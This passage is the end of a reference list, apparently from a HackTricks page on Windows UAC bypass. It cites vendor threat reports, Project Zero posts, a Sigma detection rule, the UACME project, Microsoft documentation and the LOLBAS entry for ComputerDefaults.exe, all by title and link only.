- [6] [Check Point Research – Operation TrueChaos：针对东南亚政府目标的 0-Day 攻击](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – 绕过 Windows Administrator Protection](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – 使用 SilentCleanup 任务绕过 UAC](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
- [9] [R41N3RZUF477 – UnifiedConsent、TabTip 和 Narrator Always Notify 绕过方法](https://github.com/hfiref0x/UACME/issues/173)
- [10] [Microsoft Learn – 管理员保护](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
- [11] [Google Project Zero – 从 .NET 调用本地 Windows RPC 服务器](https://projectzero.google/2019/12/calling-local-windows-rpc-servers-from.html)
- [12] [Kaspersky Securelist – HoneyMyte 使用签名的 Windows 内核 rootkit 增强 CoolClient](https://securelist.com/honeymyte-coolclient-driver-rootkit/121028)
- [13] [Group-IB – KGB RAT：用于间谍活动、窃取和恐吓的完全无法检测的 Windows 木马](https://www.group-ib.com/blog/kgb-rat-windows-fud-trojan/)
- [14] [LOLBAS – ComputerDefaults.exe](https://lolbas-project.github.io/lolbas/Binaries/ComputerDefaults/)
{{#include ../../banners/hacktricks-training.md}}
